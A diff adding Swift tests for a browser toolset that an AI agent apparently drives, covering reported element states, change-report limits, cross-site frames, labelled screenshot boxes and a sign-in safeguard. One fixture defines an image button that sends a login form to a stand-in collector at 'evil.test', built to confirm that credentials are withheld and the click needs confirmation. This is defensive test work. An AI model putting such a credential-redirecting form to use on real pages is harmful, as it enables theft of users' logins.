@@ -1412,7 +1412,8 @@ extension SharedAgentState {
                 <details><summary>More</summary>text</details><details open><summary>Less</summary>text</details>
                 <button disabled>Wait</button><button aria-disabled=true>Nope</button>
                 <input id=name value="Ann   Lee" required aria-label="Name"><input type=email value="not an email" aria-label="Mail">
-                <input type=text aria-invalid=true aria-label="Odd"><button aria-pressed=true>Bold</button><button aria-pressed=false>Italic</button>
+                <input type=text aria-invalid=true aria-label="Odd"><button aria-pressed=true>Bold</button><button aria-pressed=false>Italic</button><button aria-pressed=mixed>Underline</button>
+                <select multiple aria-label="Toppings"><option selected>Ham</option><option>Olive</option><option selected>Pepper</option><option selected>Onion</option></select>
                 <div role=tab aria-selected=true tabindex=0>Tab one</div><div role=tab aria-selected=false tabindex=0>Tab two</div>
                 <div role=button aria-expanded=false tabindex=0>Menu</div><div role=button aria-expanded=true tabindex=0>Open menu</div>
                 <input type=password value="hunter2" required pattern="[a-z]{20}" placeholder="Secret">
@@ -1432,6 +1433,8 @@ extension SharedAgentState {
             #expect(line("\"Name\"").contains("value=\"Ann Lee\"") && line("\"Name\"").contains("[focused]") && line("\"Name\"").contains("[required]"), "\(line("\"Name\""))")
             #expect(line("\"Mail\"").contains("[invalid]") && line("\"Odd\"").contains("[invalid]") && !line("\"Name\"").contains("[invalid]"))
             #expect(line("\"Bold\"").contains("[pressed]") && !line("\"Italic\"").contains("[pressed]"))
+            #expect(line("\"Underline\"").contains("[mixed]") && !line("\"Underline\"").contains("[pressed]"))
+            #expect(line("\"Toppings\"").contains("selected=\"Ham, Pepper, Onion\""), "every chosen option of a list that takes several: \(line("\"Toppings\""))")
             #expect(line("Tab one").contains("[selected]") && !line("Tab two").contains("[selected]"))
             #expect(line("\"Menu\"").contains("[collapsed]") && line("\"Open menu\"").contains("[expanded]"))
             let secret = line("(password field)")
@@ -1554,7 +1557,9 @@ extension SharedAgentState {
             defer { window.close(); browser.windowClosed() }
             let read = await call(tab, "read_page").text
             let result = await call(tab, "click", ["element_id": try #require(id(of: "Many", in: read))])
-            #expect(changes(result.text, "+").count == ToolCatalog.maxChangeLines && result.text.contains("(21 more changes are not listed. Read the page (read_page) for the rest.)"), Comment(rawValue: result.text))
+            // 60 new elements: the cap's worth are told, and the rest is counted whatever else the click changed (the button took the focus).
+            let rest = try #require(result.text.range(of: #"\((\d+) more changes"#, options: .regularExpression).flatMap { Int(result.text[$0].filter(\.isNumber)) })
+            #expect(changes(result.text, "+").count == ToolCatalog.maxChangeLines && rest == 60 - ToolCatalog.maxChangeLines, Comment(rawValue: result.text))
             let later = await call(tab, "read_page").text
             #expect(later.contains("\"Item 59\""), "a read still gives them all")
         }
@@ -1582,8 +1587,9 @@ extension SharedAgentState {
         }
 
         @Test func changesInAFrameOfAnotherSiteAreToldAndCountAsReadFromThatSite() async throws {
-            let inner = "<script>setTimeout(() => { document.body.innerHTML = '<button>Late</button>' }, 300)</script>"
-            let html = "<body><button id=go>Go</button><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
+            // The frame shows its button when the page tells it to (a message), not after a time: the test says when.
+            let inner = "<script>addEventListener('message', e => { if (e.data === 'show') { document.body.innerHTML = '<button>Late</button>'; parent.postMessage('shown', '*') } })</script>"
+            let html = "<body><script>addEventListener('message', e => { if (e.data === 'shown') window.shown = true })</script><button id=go>Go</button><iframe sandbox='allow-scripts' style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
             let (tab, window, browser) = try await page(html, host: "outer.test")
             defer { window.close(); browser.windowClosed() }
             try await asking({ _ in .once }) { stand in
@@ -1594,7 +1600,14 @@ extension SharedAgentState {
                 }
                 #expect(!read.contains("Late"), "the frame showed nothing when it was read: \(read)")
                 #expect(stand.asked.isEmpty)
-                try await Task.sleep(for: .milliseconds(500))
+                _ = await evaluate(tab, "document.querySelector('iframe').contentWindow.postMessage('show', '*'); return 'ok'")
+                // The frame tells the page when it has shown it (nothing here reads the frame, which would count as a read of its site).
+                var shown = false
+                for _ in 0..<200 where !shown {
+                    shown = await evaluate(tab, "return String(window.shown === true)") == "true"
+                    if !shown { try await Task.sleep(for: .milliseconds(25)) }
+                }
+                #expect(shown, "the frame shows it now")
                 let go = try #require(id(of: "Go", in: read))
                 let result = await call(tab, "click", ["element_id": go], caller: "mcp-frame")
                 let late = try #require(changes(result.text, "+").first, Comment(rawValue: result.text))
@@ -1604,7 +1617,51 @@ extension SharedAgentState {
                 // What the frame told is read from a site of its own, so using the page asks now, and the new element works.
                 let next = await call(tab, "click", ["element_id": number], caller: "mcp-frame")
                 #expect(!next.failed && stand.asked.filter { $0.message.contains("this page") || $0.message.contains("outer.test") }.count >= 1, "\(next.text) \(stand.asked.map(\.message))")
+                // A frame that did not answer is left alone for a while, and the report says so instead of waiting for it.
+                let slot = try #require(tab.agent.frames.known.first?.slot)
+                tab.agent.hung[slot] = Date()
+                let skipped = await call(tab, "hover", ["element_id": go], caller: "mcp-frame")
+                #expect(skipped.text.contains("1 frame from another site did not answer in time"), Comment(rawValue: skipped.text))
             }
+        }
+
+        @Test func aChangeOfTheFocusAloneIsToldLastAndTakesNoLineOfTheBudget() async throws {
+            let html = """
+                <body><button id=go onclick="for (let i = 0; i < 45; i++) { const b = document.createElement('button'); b.textContent = 'Item ' + i; document.body.append(b) }">Go</button>
+                <input id=a placeholder="Alpha"><input id=b placeholder="Beta"><script>document.getElementById('a').focus()</script></body>
+                """
+            let (tab, window, browser) = try await page(html)
+            defer { window.close(); browser.windowClosed() }
+            let read = await call(tab, "read_page").text
+            let result = await call(tab, "click", ["element_id": try #require(id(of: "Go", in: read))])
+            let lines = result.text.split(separator: "\n").map(String.init)
+            #expect(changes(result.text, "+").count == ToolCatalog.maxChangeLines, Comment(rawValue: result.text))
+            let focus = lines.indices.filter { lines[$0].hasPrefix("~ ") && lines[$0].contains("focused") }
+            #expect(focus.count == 2, "the button took the focus and the field lost it: \(focus)")
+            #expect(focus.allSatisfy { index in lines[..<index].filter { $0.hasPrefix("+ ") }.count == ToolCatalog.maxChangeLines }, "after all the new ones")
+            #expect(result.text.contains("(5 more changes"), "the five that did not fit are counted, and the focus lines took none of the room: \(result.text)")
+        }
+
+        @Test func nothingChangedSaysSoAndThatThePageMayStillBeLoading() async throws {
+            let (tab, window, browser) = try await page("<body><button id=a>Same</button></body>")
+            defer { window.close(); browser.windowClosed() }
+            let read = await call(tab, "read_page").text
+            let id = try #require(id(of: "Same", in: read))
+            _ = await call(tab, "hover", ["element_id": id])
+            let quiet = await call(tab, "hover", ["element_id": id])
+            #expect(quiet.text.contains("No interactive element changed yet; the page may still be loading — use wait_for if you expect more."), Comment(rawValue: quiet.text))
+        }
+
+        @Test func elementsBeyondTheLimitOfOneDocumentDontMakeTheNextDocumentsElementsNewLater() async throws {
+            // The first document has more elements than are looked at past the list's limit; the frame's are all beyond the limit too.
+            let inner = "<script>for (let i = 0; i < 300; i++) { const b = document.createElement('button'); b.textContent = 'Inner ' + i; document.body.append(b) }</script>"
+            let html = "<body><button id=hover>Hover me</button><script>for (let i = 0; i < 1800; i++) { const b = document.createElement('button'); b.textContent = 'Outer ' + i; document.body.append(b) }</script><iframe style='width:300px;height:100px' srcdoc=\"\(inner)\"></iframe></body>"
+            let (tab, window, browser) = try await page(html)
+            defer { window.close(); browser.windowClosed() }
+            let read = await call(tab, "read_page").text
+            let id = try #require(id(of: "Hover me", in: read))
+            let result = await call(tab, "hover", ["element_id": id])
+            #expect(changes(result.text, "+").isEmpty && !result.text.contains("more changes"), Comment(rawValue: String(result.text.prefix(600))))
         }
 
         @Test func anOptionIsJudgedByWhatItResolvesToNotByTheWordsAskedFor() async throws {
@@ -2287,6 +2344,46 @@ extension SharedAgentState {
             #expect(await evaluate(tab, "return getComputedStyle(document.getElementById('code')).webkitTextSecurity") == "none", "unmasked afterwards")
         }
 
+        @Test func aBoxIsMovedIntoTheWindowFromAFramesPixelsAndCutAtWhatShowsOfTheFrame() {
+            let place = ToolCatalog.FramePlace(x: 200, y: 100, scale: 2, left: 200, top: 100, right: 500, bottom: 300)
+            #expect(ToolCatalog.placed(.init(id: 3, x: 10, y: 20, width: 30, height: 40), in: place) == .init(id: 3, x: 220, y: 140, width: 60, height: 80))
+            #expect(ToolCatalog.placed(.init(id: 4, x: 100, y: 50, width: 100, height: 100), in: place) == .init(id: 4, x: 400, y: 200, width: 100, height: 100), "cut at the right and bottom edge")
+            #expect(ToolCatalog.placed(.init(id: 5, x: 200, y: 0, width: 10, height: 10), in: place) == nil, "outside what shows")
+            let inner = ToolCatalog.nested([10, 20, 0.5, 10, 20, 400, 400], in: place)
+            #expect(inner == .init(x: 220, y: 140, scale: 1, left: 220, top: 140, right: 500, bottom: 300), "\(String(describing: inner))")
+            #expect(ToolCatalog.nested([1, 2, 3], in: place) == nil)
+        }
+
+        @Test func aLabelledPictureBoxesAFrameInsideAFrameAndCutsWhatTheWindowHidesOfAFrame() async throws {
+            let nested = "<body style='margin:0'><button style='position:absolute;left:5px;top:5px;width:80px;height:30px'>Nested button</button></body>"
+            let middle = "<body style='margin:0'><iframe sandbox='allow-scripts' style='position:absolute;left:10px;top:20px;width:200px;height:100px;border:0' srcdoc=\"\(nested.replacingOccurrences(of: "\"", with: "&quot;"))\"></iframe></body>"
+            let edge = "<body style='margin:0'><button style='position:absolute;left:20px;top:10px;width:200px;height:30px'>Edge button</button><button style='position:absolute;left:250px;top:60px;width:40px;height:20px'>Hidden button</button></body>"
+            let html = "<body style='margin:0;overflow:hidden'><iframe sandbox='allow-scripts' style='position:absolute;left:200px;top:200px;width:300px;height:200px;border:0' srcdoc=\"\(middle.replacingOccurrences(of: "\"", with: "&quot;"))\"></iframe>"
+                + "<iframe sandbox='allow-scripts' style='position:absolute;right:-100px;top:500px;width:300px;height:100px;border:0' srcdoc=\"\(edge)\"></iframe></body>"
+            let (tab, window, browser) = try await page(html, host: "outer.test")
+            defer { window.close(); browser.windowClosed() }
+            let width = Double(await evaluate(tab, "return innerWidth")) ?? 1
+            try await asking({ _ in .once }) { _ in
+                var read = ""
+                for _ in 0..<200 where !(read.contains("Nested button") && read.contains("Edge button")) {
+                    read = await call(tab, "read_page", caller: "labels-nested").text
+                    if !(read.contains("Nested button") && read.contains("Edge button")) { try await Task.sleep(for: .milliseconds(50)) }
+                }
+                let nestedID = try #require(id(of: "Nested button", in: read), Comment(rawValue: read)), edgeID = try #require(id(of: "Edge button", in: read))
+                let hiddenID = id(of: "Hidden button", in: read)
+                let placed = await ToolCatalog.labelBoxes(tab, tab.webView!)
+                let nestedBox = try #require(placed.boxes.first { $0.id == nestedID }, "the frame inside the frame has a box: \(placed)")
+                #expect(nestedBox == .init(id: nestedID, x: 215, y: 225, width: 80, height: 30), "\(nestedBox)")
+                let edgeBox = try #require(placed.boxes.first { $0.id == edgeID })
+                #expect(edgeBox.x == width - 200 + 20 && abs(edgeBox.x + edgeBox.width - width) < 0.5, "cut where the window ends, not drawn past it: \(edgeBox) in \(width)")
+                #expect(hiddenID.map { id in !placed.boxes.contains { $0.id == id } } ?? true, "what is wholly outside the window has none")
+                #expect(placed.unplaced == 0)
+                let labelled = await ToolCatalog.call("screenshot", ["tab_id": tab.id, "labels": true], caller: "labels-nested")
+                let note = labelled.content.compactMap { $0["text"] as? String }.last ?? ""
+                #expect(!labelled.isError && note.contains("The boxes (") && note.contains("element numbers of a read_page"), Comment(rawValue: note))
+            }
+        }
+
         // MARK: sign_in
 
         private final class StubLogins: LoginStore {
@@ -2560,6 +2657,28 @@ extension SharedAgentState {
                     #expect(everything(result) == everything(ToolCatalog.signInNotDone), Comment(rawValue: everything(result)))
                     #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "", "nothing was filled into a form that now sends elsewhere")
                     #expect(store.passwordReads == 1 && confirmations.reasons.count == 1, "the user had confirmed; the page then fails the check")
+                }
+            }
+        }
+
+        @Test func anImageButtonOutsideTheFormThatNamesItAndSendsElsewhereGetsNoLoginAndAsksWhenClicked() async throws {
+            let html = """
+                <body><form id=login action="/session" onsubmit="return false"><input id=u autocomplete=username><input id=p type=password></form>
+                <input type=image form=login formaction="https://evil.test/collect" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" width=40 height=20 alt="Go" id=img></body>
+                """
+            let (tab, window, browser) = try await page(html, host: "lab.test")
+            defer { window.close(); browser.windowClosed() }
+            let store = StubLogins([("lab.test", Self.alice, Self.secret)])
+            try await signingIn(store) {
+                try await asking({ _ in .deny }) { stand in
+                    let result = await call(tab, "sign_in")
+                    #expect(result.failed && result.text.contains("another site") && stand.asked.isEmpty && store.passwordReads == 0, Comment(rawValue: result.text))
+                    #expect(await evaluate(tab, "return document.getElementById('u').value + document.getElementById('p').value") == "")
+                    // Clicking that button is asked about every time, as a form sent to another site.
+                    let read = await call(tab, "read_page").text
+                    let image = try #require(id(of: "Go", in: read), Comment(rawValue: read))
+                    _ = await call(tab, "click", ["element_id": image])
+                    #expect(stand.asked.contains { Self.isHigh($0) && $0.detail.contains("evil.test") }, "\(stand.asked.map(\.detail))")
                 }
             }
         }
